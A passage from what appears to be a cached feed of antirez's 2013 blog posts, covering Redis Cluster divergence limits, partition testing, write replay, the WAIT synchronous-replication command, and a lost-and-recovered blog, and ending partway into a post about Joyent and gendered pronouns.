<br>One of the main problems with asynchronous systems is that a master accepting requests never actually knows in a given moment if it is still the authoritative master or a stale one. For example imagine a cluster of three nodes A, B, C, with one replica each, A1, B1, C1. When a master is partitioned away with some client, A1 may be elected in the other side as the new master, but A is not able, for every request processed, to verify with the other nodes if the request should be accepted or not. At best node A can get asynchronous acknowledges from replicas.
<br>
<br>Every time this happens, two parallel time lines for the same set of data is created, one in A, and one in A1. In Redis Cluster there is no way to merge data as explained in [2], so you can imagine the merge function between A and A1 data set when the partition heals as just picking one time line between all the time lines created (two in this case).
<br>
<br>Another case that creates different time lines is the replication process itself.
<br>
<br>A master A may have three replicas A1, A2, A3. Because of the very concept of asynchronous replication, each of the slaves may represent a point in time in the past history of the time line of A. Usually since replication in Redis is very fast and has minimal delay, as data is transmitted to slaves at the same time as the reply is transmitted to the writing client, the time “delta” between A and the slaves is small. However slaves may be lagging for some reason, so it is possible that, for example, A1 is one second in the past.
<br>
<br>Asynchronously replicated nodes can’t really avoid diverging, however there is no need for the divergence between replicas to be unbound. Actually systems allowing replicas to diverge in an uncontrolled way may be hard to use in practice, even when for use case does not requiring strong consistency, that is the target of Redis Cluster.
<br>
<br>Putting bounds to divergence
<br>===
<br>
<br>Redis cluster uses a few heuristics in order to limit divergence of nodes. The algorithms employed are very simple, consisting merely on the following four rules that nodes follow.
<br>
<br>1) When a master is isolated from the majority for node-timeout (that is the user configured time after a non responding node is considered to be failing by the failure detection algorithm), it stops accepting queries from clients. It is easy to see how this helps in practice: in the majority side of the cluster, no slave is able to get elected and replace the master before node-timeout has elapsed. However, after node-timeout time has elapsed, the isolated master knows that it is possible that a parallel history was created in the other side of the cluster, and this history will win over its history, so it stops accepting data that will be otherwise lost. This means that if a master is partitioned away together with one or more clients, the window for data loss is node-timeout, that is usually in the order of 500 — 1000 milliseconds. If the partition heals before node-timeout, no data loss happens as the master rejoins the cluster as master.
<br>
<br>2) A related problem is, when a master is failing, how to pick the “best” history among the available histories for the same data (depending on the number of slaves). An algorithm is used in order to give an advantage to the slave with the most updated replication offset to be elected, that is, the slave that likely has the most recent data compared to the master that went down. However if the best slave fails to be elected the other slaves will try an election as well.
<br>
<br>3) If you think at “2” you’ll see that actually this means that the divergence between a master and its slaves is unbound. A slave can be lagging for hours in theory. So actually there is another heuristic in use, consisting on slaves to don’t try to get elected at all if the last time they received data from the master is too much in the past. This maximum time is currently set to ten times node-timeout, however it will be user-configurable in the stable release of Redis Cluster. While usually the lag between master and slaves is in the sub-millisecond figure, this time limit ensures that the worst case scenario is the following:
<br>
<br>- A slave is stopped/unavailable for just a little less than ten times node-timeout.
<br>- Its master fails.
<br>- At the same time the slave returns back available.
<br>
<br>Rejoins went wrong
<br>===
<br>
<br>There is another failure mode that was worth covering in Redis Cluster as it is in some way a different instance of the same problems covered so far. What happens if a master rejoins the cluster after it was already failed over, and there are still clients with non updated configuration writing to it?
<br>
<br>This may happens in two main ways: rejoining the majority after a partition, and restarting the process. The failure mode is conceptually the same, the master is not able to get a synchronous acknowledge from other replicas about every write, and the other nodes may take a few milliseconds before being able to reconfigure a node that just rejoined (the node is usually reconfigured with an UPDATE message as soon as it is detected to have a stale configuration: this usually happens immediately once the rejoining instance pings another node or sends a pong in reply to a ping).
<br>
<br>Rejoins are handled with another heuristic:
<br>
<br>4) When a node rejoins the majority, or is restarted, it waits a small time (but yet a few order of magnitudes bigger than the usual network latency), before accepting writes again, in order to maximize the probability to get reconfigured before accepting writes from clients with stale information.
<br>
<br>History re-play
<br>===
<br>
<br>Some of the Redis data structures and operations are commutative. Obvious examples are INCR and SADD, the order of operations does not matter and eventually the Set or the counter will have the same exact value as long as all the operations are executed.
<br>
<br>Because of this observation, and since Redis instances get asynchronous acknowledges from slaves about how much data was processed, it is possible for partitioned masters to remember commands sent by clients that are still not acknowledged by all the replicas.
<br>
<br>This trick is able to improve data safety in a way similar to AP systems, but while in AP systems merging values is used, Redis Cluster would reply commands from clients instead.
<br>
<br>I proposed this idea in a blog post [3] some time ago, however this is a practical example of what would happen implementing it in a next version of Redis Cluster:
<br>
<br>- A master gets partitioned away with clients.
<br>- Clients write to the master for node-timeout time.
<br>- The master starts returning errors.
<br>- In the majority side, a slave is elected as the new master.
<br>- When the old master rejoins it is reconfigured as a replica of the new master.
<br>
<br>So far this is the description of what happens currently. With node replying what would happen is that all the writes not acknowledged, from the time the partition is created, to the time the master starts to reply with errors, are accumulated. When the partition heals, as part of turning the old master into a slave, the old master would connect with the new master, and re-play the accumulated stream of commands.
<br>
<br>How all this is tested?
<br>===
<br>
<br>Some time ago I wrote about what I use in order to test Redis Cluster [4]. The most valuable tool I found so far is a simple consistency-test that is part of the redis-rb-cluster project [5] (a Ruby Redis Cluster client). Basically stress testing the system is as simple as keeping the consistency test running, while simulating different partitions, restarts, and other failures in the cluster.
<br>
<br>This test was so useful and is so simple to run, that I’m actually starting to think that everybody running a distributed database in production, whatever it is Cassandra or Zookeeper or Redis or whatever else, should keep a similar test running against the production system as a way to monitor what is happening.
<br>
<br>Such tests are lightweight to run, they can be made to just set a few keys per second. However they can easily detect issues with the implementation or other unexpected consistency issues. Especially systems merging data that are at the same time always available, such as AP systems, have the tendency to “mask” bugs: it takes some luck to discover some consistency leak in real data sets. With a simple consistency test running instead it is possible to monitor how the system is behaving.
<br>
<br>The following for example is the output of constency-test.rb running against my testing environment:
<br>
<br>27523967 R (7187 err) | 27523968 W (7186 err) | 12 noack |
<br>
<br>So I know that I read/wrote 27 million of times during my testing, and 12 writes that received no acknowledge were actually materialized inside the database.
<br>
<br>Notes:
<br>
<br>[1] https://groups.google.com/d/msg/redis-db/2laQRKBKkYg/ssaiQLhasNkJ
<br>[2] http://antirez.com/news/67
<br>[3] http://antirez.com/news/68
<br>[4] http://antirez.com/news/69
<br>[5] https://github.com/antirez/redis-rb-cluster
<a href=\"http://antirez.com/news/70\">Comments</a>" nil "http://antirez.com/news/70" "57c9a220ae3f5fce0d2f3a8e349a3aac") (22 (26588 31766 983954 615000) "http://antirez.com/news/69
" "Some fun with Redis Cluster testing " nil "Wed, 18 Dec 2013 15:32:21 +0000" "One of the steps to reach the goal of providing a \"testable\" Redis Cluster experience to users within a few weeks, is some serious testing that goes over the usual \"I'm running 3 nodes in my macbook, it works\". Finally this is possible, since Redis Cluster entered into the \"refinements\" stage, and most of the system design and implementation is in its final form already.
<br>
<br>In order to perform some testing I assembled an environment like that:
<br>
<br>* Hardware: 6 real computers: 2 macbook pro, 2 macbook air, 1 Linux desktop, 1 Linux tiny laptop called EEEpc running with a single core at 800Mhz.
<br>
<br>* Network: the six nodes were wired to the same network in different ways. Two nodes connected via ethernet, and four over wifi, with different access points. Basically there were three groups. The computers connected with the ethernet had 0.3 milliseconds RTT, other two computers connected with  a near access point were at around 5 milliseconds, and another group of two with another access point were not very reliable, sometime some packet went lost, latency spikes at 300-1000 milliseconds.
<br>
<br>During the simulation every computer ran Partitions.tcl (http://github.com/antirez/partitions) in order to simulate network partitions three times per minute, lasting an average of 10 seconds. Redis Cluster was configured to detect a failure after 500 milliseconds, so these settings are able to trigger a number of failover procedures.
<br>
<br>Every computer ran the following:
<br>
<br>Computer 1 and 2: Redis cluster node + Partitions.tcl + 1 client
<br>Computer 3 to 6: Redis cluster node + Partitions.tcl
<br>
<br>The cluster was configured to have three masters and three slaves in total.
<br>
<br>As client software I ran the cluster consistency test that is shipped with redis-rb-cluster (http://github.com/antirez/redis-rb-cluster), that performs atomic counters increments remembering the value client side, to detect both lost writes and non acknowledged writes that were actually accepted by the cluster.
<br>
<br>I left the simulation running for about 24 hours, however there were moments where the cluster was completely down due to too many nodes being down.
<br>
<br>The bugs
<br>===
<br>
<br>The first thing that happened in the simulation was, a big number of crashes of nodes… the simulation was able to trigger bugs that I did not noticed in the past. Also there were obvious mis-behavior due to the fact that one node, the eeepc one, was running a Redis server compiled with a 32 bit target. So in the first part of the simulation I just fixed bugs:
<br>
<br>7a666ac Cluster: set n->slaves to NULL in clusterNodeResetSlaves().
<br>fda91db Cluster: check link is valid before sending UPDATE.
<br>f57bb36 Cluster: initialize todo_before_sleep flags to 0.
<br>c70c0c6 Cluster: use proper type mstime_t for ping delay var.
<br>7c1cbdc Cluster: use an hardcoded 60 sec timeout in redis-trib connections.
<br>47815d3 Fixed clearNodeFailureIfNeeded() time type to mstime_t.
<br>e88e6a6 Cluster: use long long for timestamps in clusterGenNodesDescription().
<br>
<br>The above commits made yesterday are a mix of bugs reported by valgrind (for some part of the simulation there were nodes running over valgrind), crashes, and misbehavior of the 32 bit instance.
<br>
<br>After all the above fixes I left the simulation running for many hours without being able to trigger any crash. Basically the simulation “payed itself” just for this bug fixing activity… more minor bugs were found during the simulation that I’ve yet to fix.
<br>
<br>Behavior under partition
<br>===
<br>
<br>One of the important goals of this simulation was to test how Redis Cluster performed under partitions. While Redis Cluster does not feature strong consistency, it is designed in order to minimize write loss under some very common failure modes, and to contain data loss within a given max window under other failure modes.
<br>
<br>To understand how it works and the failure modes is simple because the way Redis Cluster itself works is simple to understand and predict. The system is just composed of different master instances handling a subset of keys each. Every master has from 0 to N replicas. In the specific case of the simulation every master had just one replica.
<br>
<br>The most important aspect regarding safety and consistency of data is the failover procedure, that is executed as follows:
<br>
<br>* A master must be detected as failing, according to the configured “node timeout”. I used 500 milliseconds as node timeout. However a single node cannot start a failover if it just detects a master is down. It must receive acknowledgements from the majority of the master nodes in order to flag the node as failing.
<br>* Every slave that flagged a node as failing will try to be elected to perform the failover. Here we use the Raft protocol election step, so that only a single slave will be able to get elected for a given epoch. The epoch will be used in order to version the new configuration of the cluster for the set of slots served by the old master.
<br>
<br>Once a slave performs the failover it reclaims the slots served by its master, and propagates the information ASAP. Other nodes that have an old configuration are updated by the cluster at a latter time if they were not reachable when the failover happened.
<br>
<br>Since the replication is asynchronous, and when a master fails we pick a slave that may not have all the master data, there are obvious failure modes where writes are lost, however Redis Cluster try to do things in order to avoid situations where, for example, a client is writing forever to a master that is partitioned away and was already failed over in the majority side.
<br>
<br>So this are the main precautions used by Redis Cluster to limit lost writes:
<br>
<br>1) Not every slave is a candidate for election. If a slaves detects its data is too old, it will not try to get elected. This in practical terms means that the cluster does not recover in the case where none of the slaves of a master are able to talk with the master for a long time, the master fails, the slave are available but have very stale data.
<br>2) If a master is isolated in the minority side of the cluster, that means, it senses the majority of the other masters are not reachable, it stops accepting writes.
<br>
<br>There are still things to improve in the heuristics Redis Cluster uses to limit data loss, for example currently it does not use the replication offset in order to give an advantage to the slave with the most fresh version of data, but only the “disconnection time” from the master. This will be implemented in the next days.
<br>
<br>However the point was to test how these mechanisms worked in the practice, and also to have a way to measure if further improvements will lead to less data loss.
<br>
<br>So this is the results obtained in this first test:
<br>
<br>* 1000 failovers
<br>* 8.5 million writes performed by each client
<br>* The system lost 2000 writes.
<br>* The system retained 800 not acknowledged writes.
<br>
<br>The amount of lost writes could appears to be extremely low considered the number of failovers performed. However note that the test program ran by the client was conceived to write to different keys so it was very easy when partitioned into a minority of masters for the client to hit an hash slot not served by the reachable masters. This resulted into waiting for the timeout to occur before of the next write. However writing to multiple keys is actually the most common case of real clients.
<br>
<br>Impressions
<br>===
<br>
<br>Running this test was pretty interesting from the point of view of the paradigm shift from Redis to Redis Cluster.
<br>When I started the test there were the bugs mentioned above still to fix, so instances crashed from time to time, still the client was almost always able to write (unless there was a partition that resulted into the cluster not being available). This is an obvious result of running a cluster, but as I’m used to see a different availability patter with what is currently the norm with Redis, this was pretty interesting to touch first hand.
<br>
<br>Another positive result was that the system worked as expected in many ways, for example the nodes always agreed about the configuration when the partitions healed, there was never a time in which I saw no partitions and the client not able to reach all the hash slots and reporting errors.
<br>
<br>The failure detection appeared to be robust enough, especially the computer connected with a very high latency network, from time to time appeared to be down to a single node, but that was not enough to get the agreement from the other nodes, avoiding a number of useless failover procedures.
<br>
<br>At the same time I noticed a number of little issues that must be fixed. For example at some point there was a power outage and the router rebooted, causing many nodes to change address. There is a built-in feature in Redis Cluster so that the cluster reconfigures itself automatically with the new addresses as long as there is a node that did not changed address, assuming every node can reach it.
<br>This system worked only half-way, and I noticed that indeed the implementation was not yet complete.
<br>
<br>Future work
<br>===
<br>
<br>This is just an initial test, and this and other tests will require to be the norm in the process of testing Redis Cluster.
<br>The first step will be to create a Redis Cluster testing environment that will be shipped with the system and that the user can run, so it is possible that the cluster will be able to support a feature to simulate partitions easily.
<br>
<br>Another thing that is worthwhile with the current test setup using partitions.tcl is the ability of the test client, and of Partitions.tcl itself, to log events. For example with a log of partitions and data loss events that has accurate enough timestamps it is possible to correlate data loss events with partitions setups.
<br>
<br>If you are interested in playing with Redis Cluster you can follow the Redis Cluster tutorial here: http://redis.io/topics/cluster-tutorial
<a href=\"http://antirez.com/news/69\">Comments</a>" nil "http://antirez.com/news/69" "2303b94a1c0a06b77a8d423a952b4d1a") (21 (26588 31766 983335 633000) "http://antirez.com/news/68
" "Redis as AP system, reloaded " nil "Wed, 11 Dec 2013 21:19:21 +0000" "So finally something really good happened from the Redis criticism thread.
<br>
<br>At the end of the work day I was reading about Redis as AP and merge operations on Twitter. At the same time I was having a private email exchange with Alexis Richardson (from RabbitMQ, and, my boss). Alexis at some point proposed that perhaps a way to improve safety was to asynchronously ACK the client about what commands actually were not received so that the client could retry. This seemed a lot of efforts in the client side, but somewhat totally opened my view on the matter.
<br>
<br>So the idea is, we can't go for synchronous replication, but indeed we get ACKs from the replicas, asynchronous ACKS, specifically.
<br>What about retaining all the writes not acknowledged into a buffer, and \"re-play\" them to the current master when the partition heals?
<br>The window we need to require to take the log is very small if the ACKs are frequent enough (currently the frequency is 1 per second, but this could be more easily).
<br>If we give up Availability after N times the window we can say, ok, no more room, we now start to reply with errors to queries.
<br>
<br>The HUGE difference with this approach is that this works regardless of the size of values. There are also semantical differences since the stream of operations is preserved instead of the value itself, so there is more context. Think for example about INCR.
<br>
<br>Of course this would not work for anything, but one could mark in the command table what command to reply and what to discard. SADD is an example of perfect command since the order of operations does not matter. DEL is likely something to avoid replying. And so forth. In turn if we reply against the wrong (stale) master, it will accumulate the commands and so forth. Details may vary, but this is the first thing that really makes a difference.
<br>
<br>Probably many of you that are into eventually consistent databases know about the log VS merge strategies already, but I had to re-invent the wheel as I was not aware. This is the kind of feedback I expected in the Redis thread that I did not received.
<br>
<br>Another cool thing about this approach is that it's pretty opt-in, it can be just a state in the connection. Send a command and the connection is of \"safe\" type, so all the commands sent will be retained and replayed if not acknowledged, and so forth.
<br>
<br>This is not going to be in the first version of Redis Cluster as I'm more happy to ship ASAP the current design, but it is a solid incremental idea that could be applied later, so a little actual result into the evolution of the design.
<a href=\"http://antirez.com/news/68\">Comments</a>" nil "http://antirez.com/news/68" "5230573091e0961b7aaab99efe4b9542") (20 (26588 31766 983115 661000) "http://antirez.com/news/67
" "The Redis criticism thread " nil "Mon, 09 Dec 2013 23:53:03 +0000" "A few days ago I tried to do an experiment by running some kind of “call for critiques” in the Redis mailing list:
<br>
<br>https://groups.google.com/forum/#!topic/redis-db/Oazt2k7Lzz4
<br>
<br>The thread has reached 89 posts so far, probably one of the biggest threads in the history of the Redis google group.
<br>The main idea was that critiques are a mix of pointless attacks, and truth, so to extract the truth from critiques can be a good exercise, it means to have some seed idea for future improvements from the part of the population that is not using or is not happy with your system.
<br>
<br>There were a lot of arguments possible: threading, persistence model, API, security, and so forth, however the argument that received the most attention was Redis Cluster design and its tradeoffs. There are people that are not convinced by the proposed design since it does not provide strong Consistency nor Availability (“C” and “A” of CAP, not any random consistency or availability).
<br>
<br>Instead it only provides some form of weaker consistency and some failure resistance. In this blog post I want to clarify why this is in my opinion the right choice for Redis.
<br>
<br>Strong consistency requires synchronous replication, and depending on the failure models you want to handle, it also requires to fsync data on disk at every write, in order to cover failures like all the nodes in a single data center rebooting for a power outage.
<br>Redis is what it is because the performance and latency characteristics, so a model like the above would not be Redis.
<br>
<br>So Redis Cluster trades Consistency for performance. The tradeoff is that there are well defined failure modes where it is possible to lose writes, however the system is designed in order to minimize lost writes under certain assumptions.
<br>
<br>The other property we give away is availability, because being available means, in order to have a decent consistency story, to merge values when partitions heals. Redis data model is not merge-friendly, Redis uses the fact that data representation is in memory to get an advantage and export rich data structures to the user that have practically no limits in the size of every single value, if not the available memory. So there are Redis deployments with just a few keys, with sorted set values of many million of elements, to implement leader boards of Facebook games, and stuff like that.
<br>
<br>Merging huge and complex values is extremely hard and not very practical. Implementing the values in a way that makes merging more manageable would mean instead to forget the current performance at all.
<br>
<br>So we trade Availability for a more powerful data model. We still have some degree of resistance to failures. Nodes can stop working and partitions can happen, and as long as there is the majority of master nodes up and at least a replica for each hash slot, the system is able to accept queries from clients.
<br>
<br>I believe this is a perfectly acceptable design and is able to provide great performances with consistency and availability guarantees that are reasonable for many class of applications. To get an idea about how it is possible to lose writes you can read the Redis Cluster tutorial here: http://redis.io/topics/cluster-tutorial
<br>
<br>Note that in the meantime Redis unstable got an implementation of synchronous replication. It is not capable of providing strong consistency alone, but it is able to improve the consistency guarantees that the system is able to provide for certain writes (less / hard to trigger failure modes). However I believe that most users want Redis for very high loads, so this feature will likely be not very used.
<br>
<br>Why Redis Cluster?
<br>===
<br>
<br>The real goal of Redis Cluster is not to provide the coolest consistent or available system, its goal was to provide what Redis is, but distributed in many nodes with *automatic sharding*. That was the real trigger: users can’t reinvent again and again client-side sharding, something that can do this for you is very useful, especially if it is designed in a way that 100 nodes will provide the performances of a single instance multiplied by 100.
<br>
<br>This is the main reason I want to see it working and deployed, because I believe it can make a huge difference for the Redis users.
<br>Being it a distributed system it should also be operational friendly (that was another design goal), provide some resistance to failure, and easy to predict failure modes. So consistency and availability are automatically concerns and huge part of the tradeoffs to make of course.
<br>
<br>I’m excited about Redis Cluster. I truly believe it will benefit many users.
<br>
<br>Redis became what it is, this strange tool that many developers learned to live and to solve problems with, because I tried to never be dogmatic about the development process and the tradeoffs, sometimes extreme, to take.
<br>For example the fact that Redis is probably the only top-used database system developed mostly by a single individual currently (at our max we were Pieter half-time and I full-time) is the result of this choices: I’m not magic, the only way to do it is to realize your limits and design and plan for them.
<br>
<br>So, as long as there are users doing good work with it, the Redis experiment is here to stay. Ended the thread I’ll start with my usual routine, grab a coffee in the morning, sit in the front of my computer, and do the only thing I’m really good at: write some code.
<br>
<br>Thanks everybody that took part to the thread. Probably I would not do it again, since it was more stressful than useful honestly, however sometimes odd things must be tried, and it feels great to don’t fear the critiques.
<br>
<br>Write code and be free.
<a href=\"http://antirez.com/news/67\">Comments</a>" nil "http://antirez.com/news/67" "c17efa92d100f967ed98a34732a15c21") (19 (26588 31766 982702 762000) "http://antirez.com/news/66
" "WAIT: synchronous replication for Redis " nil "Thu, 05 Dec 2013 09:50:33 +0000" "Redis unstable has a new command called \"WAIT\". Such a simple name, is indeed the incarnation of a simple feature consisting of less than 200 lines of code, but providing an interesting way to change the default behavior of Redis replication.
<br>
<br>The feature was extremely easy to implement because of previous work made. WAIT was basically a direct consequence of the new Redis replication design (that started with Redis 2.8). The feature itself is in a form that respects the design of Redis, so it is relatively different from other implementations of synchronous replication, both at API level, and from the point of view of the degree of consistency it is able to ensure.
<br>
<br>Replication: synchronous or not?
<br>===
<br>
<br>Replication is one of the main concepts of distributed systems. For some state to be durable even when processes fail or when there are network partitions making processes unable to communicate, we are forced to use a simple but effective strategy, that is to take the same information “replicated” across different processes (database nodes).
<br>
<br>Every kind of system featuring strong consistency will use a form of replication called synchronous replication. It means that before some new data is considered “committed”, a node requires acknowledge from other nodes that the information was received. The node initially proposing the new state, when the acknowledge is received, will consider the information committed and will reply to the client that everything went ok.
<br>
<br>There is a price to pay for this safety: latency. Systems implementing strong consistency are unable to reply to the client before receiving enough acknowledges. How many acks are “enough”? This depends on the kind of system you are designing. For example in the case of strong consistent systems that are available as long as the majority of nodes are working, the majority of the nodes should reply back before some data is considered to be committed. The result is that the latency is bound to the slowest node that replies as the (N/2+1)th node. Slower nodes can be ignored once the majority is reached.
<br>
<br>Asynchronous replication
<br>===
<br>
<br>This is why asynchronous replication exists: in this alternative model we reply to the client confirming its write BEFORE we get acknowledges from other nodes.
<br>If you think at it from the point of view of CAP, it is like if the node *pretends* that there is a partition and can’t talk with the other nodes. The information will eventually be replicated at a latter time, exactly like an eventually consistent DB would do during a partition. Usually this latter time will be a few hundred microseconds later, but if the node receiving the write fails before propagating the write, but after it already sent the reply to the client, the write is lost forever even if it was acknowledged.
<br>
<br>Redis uses asynchronous replication by default: Redis is designed for performances and low, easy to predict, latency. However if possible it is nice for a system to be able to adapt consistency guarantees depending on the kind of write, so some form of synchronous replication could be handy even for Redis.
<br>
<br>WAIT: call me synchronous if you want.
<br>===
<br>
<br>The way I depicted synchronous replication above, makes it sound simpler than it actually is.
<br>
<br>The reality is that usually synchronous replication is “transactional”, so that a write is propagated to the majority of nodes (or *all* the nodes with some older algorithm), or none, in one way or the other not only the node proposing the state change must wait for a reply from the majority, but also the other nodes need to wait for the proposing node to consider the operation committed in order to, in turn, commit the change. Replicas require in one way or the other a mechanism to collect the write without applying it, basically.
<br>
<br>This means that nothing happens during this process, everything is blocked for the current operation, and later you can process a new one, and so forth and so forth.
<br>
<br>Because synchronous replication can be very costly, maybe we can do with a bit less? We want a way to make sure some write propagated across the replicas, but at the same time we want other clients to go at light speed as usually sending commands and receiving replies. Clients waiting in a synchronous write should never block any other client doing other synchronous or non-synchronous work.
<br>
<br>There is a tradeoff you can take: WAIT does not allow to rollback an operation that was not propagated to enough slaves. It only offers, merely, a way to inform the client about what happened.
<br>The information, specifically, is the number of replicas that your write was able to reach, all this encapsulated into a simple to use blocking command.
<br>
<br>This is how it works:
<br>
<br>redis 127.0.0.1:9999> set foo bar
<br>OK
<br>redis 127.0.0.1:9999> incr mycounter
<br>(integer) 1
<br>redis 127.0.0.1:9999> wait 5 100
<br>(integer) 7
<br>
<br>Basically you can send any number of commands, and they’ll be executed, and replicated as usually.
<br>As soon as you call WAIT however the client stops until all the writes above are successfully replicated to the specified number of replicas (5 in the example), unless the timeout is reached (100 milliseconds in the example).
<br>
<br>Once one of the two limits is reached, that is, the master replicated to 5 replicas, or the timeout was reached, the command returns, sending as reply the number of replicas reached. If the return value is less than the replicas we specified, the request timed out, otherwise the above commands were successfully replicated to the specified number of replicas.
<br>
<br>In practical terms this means that you have to deal with the condition in which the command was accepted by less replicas you specified in the amount of time you specified. More about that later.
<br>
<br>How it works?
<br>===
<br>
<br>The WAIT implementation is surprisingly simple. The first thing I did was to take the blocking code of BLPOP & other similar operations and make it a generic primitive of Redis internal API, so now implementing blocking commands is much simpler.
<br>
<br>The rest of the implementation was trivial because 2.8 introduced the concept of master replication offset, that is, a global offset that we increment every time we send something to the slaves. All the salves receive exactly the same stream of data, and remember the offset processed so far as well.
<br>
<br>This is very useful for partial resynchronization as you can guess, but moreover slaves acknowledge the amount of replication offset processed so far, every second, with the master, so the master has some idea about how much they processed.
<br>
<br>Every second sucks right? We can’t base WAIT on an information available every second. So when WAIT is used by a client, it sets a flag, so that all the WAIT callers in a given event loop iteration will be grouped together, and before entering the event loop again we send a REPLCONF GETACK command into the replication stream. Slaves will reply ASAP with a new ACK.
<br>
<br>As soon as the ACKs received from slaves is enough to unblock some client, we do it. Otherwise we unblock the client on timeout.
<br>
<br>Not considering the refactoring needed for the block operations that is technically not part of the WAIT implementation, all the code is like 170 lines of code, so very easy to understand, modify, and with almost zero effects on the rest of the code base.
<br>
<br>Living with the indetermination
<br>===
<br>
<br>WAIT does not offer any “transactional” feature to commit a write to N nodes or nothing, but provides information about the degree of durability we achieved with our write, in an easy to use form that does not slow down operations of other clients.
<br>
<br>How this improves consistency in Redis land? Let’s look at the following pseudo code:
<br>
<br>    def save_payment(payment_id)
<br>        redis.set(payment_id,”confirmed”)
<br>    end
<br>
<br>We can imagine that the function save_payment is called every time an user payed for something, and we want to store this information in our database. Now imagine that there are a number of clients processing payments, so the function above gets called again and again.
<br>
<br>In Redis 2.6 if there was an issue communicating with the replicas, while running the above code, it was impossible to sense the problem in time. The master failing could result in replicas missing a number of writes.
<br>
<br>In Redis 2.8 this was improved by providing options to stop accepting writes if there are problems communicating with replicas. Redis can check if there are at least N replicas that appear to be alive (pinging back the master) in this setup. With this option we improved the consistency guarantees a bit, now there is a maximum window to write to a master that is not backed by enough replicas.
<br>
<br>With WAIT we can finally considerably improve how much safe are our writes, since I can modify the code in the following way:
<br>
<br>    def save_payment(payment_id)
<br>        redis.set(payment_id,”confirmed”)
<br>        if redis.wait(3,1000) >= 3 then
<br>            return true
<br>        else
<br>            return false
<br>    end
<br>
<br>In the above version of the program we finally gained some information about what happened to the write, even if we actually did not changed the outcome of the write, we are now able to report back this information to the caller.
<br>However what to do if wait returns less than 3? Maybe we could try to revert our write sending redis.del(payment_id)?  Or we can try to set the value again in order to succeed the next time?
<br>
<br>With the above code we are exposing our system to too much troubles. In a given moment if only two slaves are accepting writes all the transactions will have to deal with this inconsistency, whatever it is handled. There is a better thing we can do, modifying the code in a way so that it actually does not set a value, but takes a list of events about the transaction, using Redis lists:
<br>
<br>    def save_payment(payment_id)
<br>        redis.rpush(payment_id,”in progress”) # Return false on exception
<br>        if redis.wait(3,1000) >= 3 then
<br>            redis.rpush(payment_id,”confirmed”) # Return false on exception
<br>            if redis.wait(3,1000) >= 3 then
<br>                return true
<br>            else
<br>                redis.rpush(payment_id,”cancelled”)
<br>                return false
<br>            end
<br>        else
<br>            return false
<br>    end
<br>
<br>Here we push an “in progress” state into the list for this payment ID before to actually confirming it. If we can’t reach enough replicas we abort the payment, and it will not have the “confirmed” element. In this way if there are only two replicas getting writes the transactions will fail one after the other. The only clients that will have the deal with inconsistencies are the clients that are able to propagate “in progress” to 3 or more replicas but are not able to do the same with the “confirmed” write. In the above code we try to deal with this issue with a best-effort “cancelled” write, however there is still the possibility of a race condition:
<br>
<br>1) We send “in progress”
<br>2) We send “confirmed”, it only reaches 2 slaves.
<br>3) We send “cancelled” but at this point the master crashed and a failover elected one of the slaves.
<br>
<br>So in the above case we returned a failed transaction while actually the “confirmed” state was written.
<br>
<br>You can do different things to deal better with this kind of issues, that is, to mark the transaction as “broken” in a strong consistent and highly available system like Zookeeper, to write a log in the local client, to put it in the hands of a message queue that is designed with some redundancy, and so forth.
<br>
<br>Synchronous replication and failover: two close friends
<br>===
<br>
<br>Synchronous replication is important per se because it means, there are N copies of this data around, however to really exploit the improved data safety, we need to make sure that when a master node fails, and a slave is elected, we get the best slave.
<br>
<br>The new implementation of Sentinel already elects the slave with the best replication offset available, assuming it publishes its replication offset via INFO (that is, it must be Redis 2.8 or greater), so a good setup can be to run an odd number of Redis nodes, with a Redis Sentinel installed in every node, and use synchronous replication to write to the majority of nodes. As long as the majority of the nodes is available, a Sentinel will be able to win the election and elect a slave with the most updated data.
<br>
<br>Redis cluster is currently not able to elect the slave with the best replication offset, but will be able to do that before the stable release. It is also conceivable that Redis Cluster will have an option to only promote a slave if the majority of replicas for a given hash slot are reachable.
<br>
<br>I just scratched the surface of synchronous replication, but I believe that this is a building block that we Redis users will be able to exploit in the future to stretch Redis capabilities to cover new needs for which Redis was traditionally felt as inadequate.
<a href=\"http://antirez.com/news/66\">Comments</a>" nil "http://antirez.com/news/66" "a7f555e160ffb37dccc50547ca6d6eba") (18 (26588 31766 982040 930000) "http://antirez.com/news/65
" "Blog lost and recovered in 30 minutes " nil "Mon, 02 Dec 2013 08:52:19 +0000" "Yesterday I lost all my blog data in a rather funny way. When I installed this new blog engine, that is basically a Lamer News slightly modified to serve as a blog, I spinned a Redis instance manually with persistence *disabled* just to see if it was working and test it a bit.
<br>
<br>I just started a screen instance, and run something like ./redis-server --port 10000. Since this is equivalent to an empty config file with just \"port 10000\" inside I was running no disk backed at all.
<br>
<br>Since Redis very rarely crashes, guess what, after more than one year it was still running inside the screen session, and I totally forgot that it was running like that, happily writing controversial posts in my blog. Yesterday my server was under attack. This caused an higher then normal load, and Linode rebooted the instance. As a result my blog was gone.
<br>
<br>The good thing is that I recovered everything in about 30 minutes because simple systems are really better than complex systems when something bad happens. This blog is composed of posts that are just the verbatim dump of what I write in a text area. No formatting at all. Comments are handled by Disqus and the ID I submit is just the post ID.
<br>
<br>All I had to do is to setup a new Redis server (this time with AOF, demonized, and a proper configuration file) and search in google one after the other the posts by URL (which is the same for all the post, only the incremental ID changes). For every post I opened the Google cache of the post, select the text, copy, and submit the new post.
<br>
<br>The only thing I lost are the post dates... I could fix them modifying a bit the blog code to allow me to do this, but not sure I'll be able to find the time.
<br>
<br>Long story short, this is a trivial example, and an human error, but even in serious well maintained systems shit happens, and when the architecture of something is simple, it is simpler to deal with even during failures.
<br>
<br>Without to mention that now I know I don't have to enable backups as I can recovery everything. No, just kidding.
<a href=\"http://antirez.com/news/65\">Comments</a>" nil "http://antirez.com/news/65" "87e8e20ee2bac38323ec141d19ed06bf") (17 (26588 31766 981876 766000) "http://antirez.com/news/64
" "The fight against sexism is not a free pass " nil "Sun, 01 Dec 2013 15:48:37 +0000" "Today Joyent wrote a blog post in the company blog about an issue that started with this pull request in the libuv project: https://github.com/joyent/libuv/pull/1015#issuecomment-29538615
<br>
<br>Basically the developer Ben Noordhuis rejected a pull request involving a change in the documentation to use gender-neutral form instead of “him”. Joyent replied with this incredible post: http://www.joyent.com/blog/the-power-of-a-pronoun.
<br>
<br>In the blog post you can read:
<br>
<br>“But while Isaac is a Joyent employee, Ben is not—and if he had been, he wouldn't be as of this morning: to reject a pull request that eliminates a gendered pronoun on the principle that pronouns should in fact be gendered would constitute a fireable offense for me and for Joyent.”
<br>
<br>A few lines later you can read: “Indeed, one of the challenges of an open source project that depends on volunteer effort isdealing with assholes”
<br>
